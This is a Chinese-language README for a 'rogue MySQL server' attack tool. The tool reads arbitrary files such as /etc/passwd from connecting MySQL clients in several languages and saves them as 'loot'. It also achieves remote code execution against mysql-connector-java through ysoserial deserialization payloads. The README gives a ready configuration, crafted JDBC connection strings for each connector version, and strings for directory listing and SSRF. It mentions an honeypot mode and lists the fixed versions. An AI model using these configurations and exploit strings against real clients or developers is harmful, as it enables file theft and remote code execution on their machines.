# Rogue Mysql Server

[English README](./README_EN.md)

基于 https://github.com/vitessio/vitess 实现的恶意 mysql 服务器, 支持 go, php, python, java, 原生命令行等多种语言下的多种库的 mysql 客户端.  
远离恼人的兼容性问题, 测试过的客户端见下表

| language | library                        | pass |
|----------|--------------------------------|------|
| go       | github.com/go-sql-driver/mysql | ✔️   |
| php      | mysqli, pdo                    | ✔️   |
| python   | pymysql                        | ✔️   |
| java     | mysql-connector-java           | ✔️   |
| native   | 10.4.13-MariaDB                | ✔️   |

觉得好用可以点右上方的 🌟 支持作者

## 功能

* 可以兼容多种 mysql 客户端
* 可以读取二进制文件
* 自动保存文件
* 作为蜜罐使用时, 可选择开启帐号密码验证
* 读取客户端的 ConnAttr, 可能会包含一些客户端的额外信息
* 对于 mysql-connector-java, 在可控链接串的情况下可以利用反序列化漏洞进行 RCE

## 使用

在当前目录下生成配置文件模版, 如果已有配置文件可以跳过这一步
```sh
./rogue_mysql_server -generate
```

运行服务器, 使用刚刚生成的 config.yaml
```sh
./rogue_mysql_server
```

或者手动指定配置路径
```sh
./rogue_mysql_server -config other_config.yaml
```

## 配置文件

示例:
```yaml
host: 0.0.0.0
port: 3306
# 监听的 IP 和端口.

version_string: "10.4.13-MariaDB-log"
# 客户端得到的服务端版本信息.

file_list: ["/etc/passwd", "C:/boot.ini"]
save_path: ./loot
# 需要读取的文件, 注意这个不意味着一次性读取列表中的所有文件 (很多客户端实现不支持这种操作).
# 而是客户端每执行一次语句, 按照列表中的顺序读取一个文件, 并保存到 `save_path` 文件夹中.

always_read: true
# 如果为 true, 那么不管客户端是否标记自己支持 LOAD DATA LOCAL, 都会尝试去读取文件, 否则会根据客户端的标记来决定是否读取, 避免客户端请求不同步.

from_database_name: false
# 如果为 true, 将会从客户端设定中的数据库名称中提取要读取的文件.
# 例如链接串为 `jdbc:mysql://localhost:3306/%2fetc%2fhosts?allowLoadLocalInfile=true`.
# 将会从客户端读取 `/etc/hosts` 而不会遵循 `file_list` 中的设置.

max_file_size: 0
# 读取文件的最大大小 (单位 byte), 超过这个大小的文件内容将会被忽略. 如果 <= 0, 代表没有限制.

auth: false
users:
  - root: root
  - root: password
# 对应是否开启验证, 如果为 `false`, 那么不管输什么密码或者不输入密码都可以登录.
# 如果为 `true`, 则需要帐号密码匹配下面的设置的帐号密码中的一条.

jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
# 见 `jdbc 利用相关` 一节
```

## mysql-connector-java 反序列化漏洞利用相关

在版本 >= 8.0.20, >= 5.1.49 中, 此漏洞已经被修复,  
https://github.com/mysql/mysql-connector-j/commit/de7e1af306ffbb8118125a865998f64ee5b35b1b  
https://github.com/mysql/mysql-connector-j/commit/13f06c38fb68757607c460789196e3f798d506f2

与 mysql-connector-java 反序列化漏洞利用相关的配置如下
```yaml
jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
```
`jdbc_exploit` 代表这个功能开启, 在检测到客户端是 mysql-connector-j 的情况下会自动利用. 利用和读取文件只能同时开启一项, 开启利用会导致无法读取客户端的文件.  
`always_exploit` 代表不检测客户端是否为 mysql-connector-java, 总是开启漏洞利用.  
`ysoserial_command` 生成反序列化 payload 的命令.  

可以使用连接串中的 `connectionAttributes` 选项来指定需要使用的 payload, 这个选项可以指定任意连接属性. 服务器会读取连接属性中 `t` 的值来寻找对应的 payload. 如果未指定, 则默认使用提供的所有 payload 中的第一个.  

例如, 如果使用上述的示例配置:  
在 8.x 版本下要使用 cc7, 连接串为 `jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password`

另外需要注意只支持 `com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor` 的利用方法, 可以参考下表:  

| version  | jdbc connection string                                                                                                                                                                                   |
|----------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 8.x      | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password     |
| 6.x      | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password |
| >=5.1.11 | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password    |

另外如果需要读文件, mysql-connector-java 支持使用 `file://` 列目录 (当然其他协议, 例如 http 来 SSRF 也是可以的), 但是需要在 `allowLoadLocalInfile` 为 true 之外, 额外指定 `allowUrlInLocalInfile` 为 true, 详情见[这里](https://github.com/mysql/mysql-connector-j/blob/dd61577595edad45c398af508cf91ad26fc4144f/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1877)  
E.g.
* 列 `/` 目录, `jdbc:mysql://127.0.0.1:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
* SSRF `http://127.0.0.1:25565`, `jdbc:mysql://127.0.0.1:3306/http%3A%2F%2F127.0.0.1:25565?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`


## Ref

mysql-connector-java 漏洞利用:  
https://github.com/fnmsd/MySQL_Fake_Server

mysql 协议相关:  
https://github.com/mysql/mysql-connector-j  
https://github.com/vitessio/vitess  
https://github.com/src-d/go-mysql-server  
http://scz.617.cn:8/network/202001101612.txt  
